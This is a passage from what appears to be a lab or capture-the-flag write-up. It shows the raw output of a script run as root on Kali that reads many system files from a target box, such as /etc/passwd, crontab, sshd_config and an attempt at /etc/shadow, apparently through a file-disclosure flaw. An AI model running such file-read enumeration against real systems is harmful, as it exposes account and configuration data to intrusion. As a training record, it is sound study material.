class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ./s.sh  </span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/apache/apache/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/apache/apache2/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/apache/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/bin/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/anacrontab:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache/apache.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache2/apache.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache2/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache2/sites-available/default:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/apache2/vhosts.d/00_default_vhost.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/at.allow:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/at.deny:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/cron.allow:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/cron.deny:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/crontab:</span><br><span class="line"># /etc/crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs do.</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">#</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/fstab:</span><br><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &#x27;blkid&#x27; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/sda1 during installation</span><br><span class="line">UUID=d0c20a19-945b-4f91-8ea2-8466c005b946 /               ext4    errors=remount-ro 0       1</span><br><span class="line"># swap was on /dev/sda5 during installation</span><br><span class="line">UUID=635c225b-1f26-4d4e-912a-87db360ddbb1 none            swap    sw              0       0</span><br><span class="line">/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/host.conf:</span><br><span class="line">multi on</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/conf.d/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/conf.d/php.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/conf/httpd.conf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/htdocs/index.html:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/htdocs/index.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/logs/access.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/logs/access_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/logs/error.log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/logs/error_log:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/httpd/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/init.d/httpd:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/init.d/mysql:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ld.so.conf:</span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line"></span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/motd:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/my.cnf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/mysql/my.cnf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/mysql/my.cnf:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/network/interfaces:</span><br><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5).</span><br><span class="line"></span><br><span class="line">source /etc/network/interfaces.d/*</span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug enp0s3</span><br><span class="line">iface enp0s3 inet dhcp</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/networks:</span><br><span class="line">default         0.0.0.0</span><br><span class="line">loopback        127.0.0.0</span><br><span class="line">link-local      169.254.0.0</span><br><span class="line"></span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/passwd:</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php/apache2/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php/cgi/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php/php4/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php4.4/fcgi/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php4/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php4/apache2/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php4/cgi/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php5/apache/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php5/apache2/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/php5/cgi/php.ini:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/phpmyadmin/config.inc.php:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/resolv.conf:</span><br><span class="line">domain home</span><br><span class="line">search home</span><br><span class="line">nameserver 192.168.1.1</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/shadow:</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/sshd_config:</span><br><span class="line">#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><br><span class="line"></span><br><span class="line"># This is the sshd server system-wide configuration file.  See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented.  Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br><span class="line"></span><br><span class="line">#PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><br><span class="line">#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">#PasswordAuthentication yes</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">#GSSAPIAuthentication no</span><br><span class="line">#GSSAPICleanupCredentials yes</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line"></span><br><span class="line"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">PrintMotd no</span><br><span class="line">PrintLastLog no</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile /var/run/sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Allow client to pass locale environment variables</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem       sftp    /usr/lib/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#       X11Forwarding no</span><br><span class="line">#       AllowTcpForwarding no</span><br><span class="line">#       PermitTTY no</span><br><span class="line">#       ForceCommand cvs server</span><br><span class="line">################################################</span><br><span class="line">&gt;&gt;&gt;/etc/ssh/ssh_config:</span><br><span class="line"></span><br><span class="line"># This is the ssh client system-wide configuration file.  See</span><br><span class="line"># ssh_config(5) for more information.  This file provides defaults for</span><br><span class="line"># users, and the values can be changed in per-user configuration files</span><br><span class="line"># or on the command line.</span><br><span class="line"></span><br><span class="line"># Configuration data is parsed as follows:</span><br><span class="line">#  1. command line options</span><br><span class="line">#  2. user-specific file</span><br><span class="line">#  3. system-wide file</span><br><span class="line"># Any configuration value is only changed the first time it is set.</span><br><span class="line"># Thus, host-specific definitions should be at the beginning of the</span><br><span class="line"># configuration file, and defaults at the end.</span><br><span class="line"></span><br><span class="line"># Site-wide defaults for some commonly used options.  For a comprehensive</span><br><span class="line"># list of available options, their meanings and defaults, please see the</span><br><span class="line"># ssh_config(5) man page.</span><br><span class="line"></span><br><span class="line">Host *</span><br><span class="line">#   ForwardAgent no</span><br><span class="line">#   ForwardX11 no</span><br><span class="line">#   ForwardX11Trusted yes</span><br><span class="line">#   PasswordAuthentication yes</span><br><span class="line">#   HostbasedAuthentication no</span><br><span class="line">#   GSSAPIAuthentication no</span><br><span class="line">#   GSSAPIDelegateCredentials no</span><br><span class="line">#   GSSAPIKeyExchange no</span><br><span class="line">#   GSSAPITrustDNS no</span><br><span class="line">#   BatchMode no</span><br><span class="line">#   CheckHostIP yes</span><br><span class="line">#   AddressFamily any</span><br><span class="line">#   ConnectTimeout 0</span><br><span class="line">#   StrictHostKeyChecking ask</span><br><span class="line">#   IdentityFile ~/.ssh/id_rsa</span><br><span class="line">#   IdentityFile ~/.ssh/id_dsa</span><br><span class="line">#   IdentityFile ~/.ssh/id_ecdsa</span><br><span class="line">#   IdentityFile ~/.ssh/id_ed25519</span><br><span class="line">#   Port 22</span><br><span class="line">#   Protocol 2</span><br><span class="line">#   Ciphers 